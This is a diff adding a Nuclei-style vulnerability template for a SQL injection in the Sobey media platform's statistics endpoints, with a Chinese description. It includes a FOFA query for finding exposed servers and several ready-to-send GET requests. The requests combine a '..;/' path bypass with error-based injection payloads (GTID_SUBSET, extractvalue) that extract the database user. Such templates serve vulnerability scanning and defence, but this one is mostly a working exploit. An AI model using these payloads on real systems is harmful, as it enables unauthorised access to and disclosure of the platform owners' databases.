@@ -1,0 +1,27 @@
+id: sobey-media-countjztarticlegroupbychannel2-sqli
+
+info:
+  name: 索贝融媒体工作平台 countJztArticleGroupByChannel2 接口 SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="SOBEY-融媒体"
+          索贝融媒体工作平台的 /sobey-mchEditor/mch/Jzt/statistics/countJztArticleGroupByChannel2 接口在参数处理过程中未正确过滤特殊字符，存在SQL注入漏洞。攻击者通过构造包含恶意SQL负载的请求，可实现对底层数据库的非授权查询与操作，导致敏感数据泄露或数据库控制权丧失。
+          GET /sobey-mchEditor/js/..;/mch/Jzt/statistics/countJztArticle?siteCode=&token=&userCode=admin&channelId=1&isRenYuan=1&userCode=1'+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1709=1709,1))),md5(1)),1709)and+'1'='1 HTTP/1.1
+
+      GET /sobey-mchEditor/js/..;/mch/Jzt/statistics/countJztTWArticle?siteCode=&token=&userCode=admin&channelId=1&isRenYuan=1&userCode=1'+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1709=1709,1))),md5(1)),1709)and+'1'='1 HTTP/1.1
+
+      GET /sobey-mchEditor/js/..;/mch/Jzt/statistics/countJztMonthsDetailArticle?siteCode=&token=&userCode=admin&channelId=1&isRenYuan=1&userCode=1'+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1709=1709,1))),md5(1)),1709)and+'1'='1 HTTP/1.1
+  tags: 索贝融媒体工作平台
+
+http:
+- raw:
+  - |
+    GET /sobey-mchEditor/js/..;/mch/Jzt/statistics/countJztArticleGroupByChannel2?siteCode=&token=&userCode=admin&channelId=1&catalogid=1&channelId=1+AND+extractvalue(1,concat(0x7e,(SELECT+user()))) HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'XPATH'
